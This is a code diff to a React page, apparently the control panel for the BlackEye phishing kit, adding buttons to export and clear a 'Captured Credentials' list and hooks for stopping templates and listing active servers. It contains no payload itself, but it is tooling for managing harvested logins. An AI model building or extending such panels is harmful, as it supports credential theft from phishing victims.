@@ -46,6 +46,7 @@ import {
   Zap,
   Package,
   Search,
+  Trash2,
 } from "lucide-react";
 import VpsNodeManager from "@/components/VpsNodeManager";
 import { StreamingTerminal } from "@/components/StreamingTerminal";
@@ -169,6 +170,11 @@ export default function BlackEyePage() {
   const logsMutation = trpc.blackeye.getLogs.useMutation();
   const updateMutation = trpc.blackeye.update.useMutation();
   const commandMutation = trpc.blackeye.runCommand.useMutation();
+  // New advanced endpoints
+  const clearCapturesMutation = trpc.blackeye.clearCaptures.useMutation();
+  const exportCapturesMutation = trpc.blackeye.exportCaptures.useMutation();
+  const getActiveServersMutation = trpc.blackeye.getActiveServers.useMutation();
+  const stopTemplateMutation = trpc.blackeye.stopTemplate.useMutation();
 
   // Node management hooks for VpsNodeManager
   const listNodesQuery = trpc.blackeye.listNodes.useQuery(undefined);
@@ -591,16 +597,22 @@ export default function BlackEyePage() {
                   <Eye className="w-4 h-4 text-orange-400" />
                   Captured Credentials
                 </CardTitle>
-                <Button
-                  size="sm"
-                  variant="outline"
-                  className="border-zinc-700"
-                  onClick={handleGetCaptured}
-                  disabled={capturedMutation.isPending}
-                >
-                  <RefreshCw className={`w-4 h-4 mr-2 ${capturedMutation.isPending ? "animate-spin" : ""}`} />
-                  Refresh
-                </Button>
+                <div className="flex gap-2">
+                  <Button size="sm" variant="outline" className="border-zinc-700" onClick={handleGetCaptured} disabled={capturedMutation.isPending}>
+                    <RefreshCw className={`w-4 h-4 mr-2 ${capturedMutation.isPending ? "animate-spin" : ""}`} /> Refresh
+                  </Button>
+                  <Button size="sm" variant="outline" className="border-zinc-700 text-zinc-300" onClick={() => exportCapturesMutation.mutateAsync().then(r => {
+                    const blob = new Blob([JSON.stringify(r.captures, null, 2)], { type: "application/json" });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement("a"); a.href = url; a.download = "blackeye-captures.json"; a.click();
+                    toast.success(`Exported ${r.count} captures`);
+                  })} disabled={exportCapturesMutation.isPending}>
+                    <Download className="w-4 h-4 mr-2" /> Export
+                  </Button>
+                  <Button size="sm" variant="outline" className="border-red-700 text-red-400 hover:bg-red-500/10" onClick={() => clearCapturesMutation.mutateAsync().then(() => { toast.success("Captures cleared"); handleGetCaptured(); })} disabled={clearCapturesMutation.isPending}>
+                    <Trash2 className="w-4 h-4 mr-2" /> Clear All
+                  </Button>
+                </div>
               </CardHeader>
               <CardContent>
                 {capturedMutation.data?.captures && capturedMutation.data.captures.length > 0 ? (
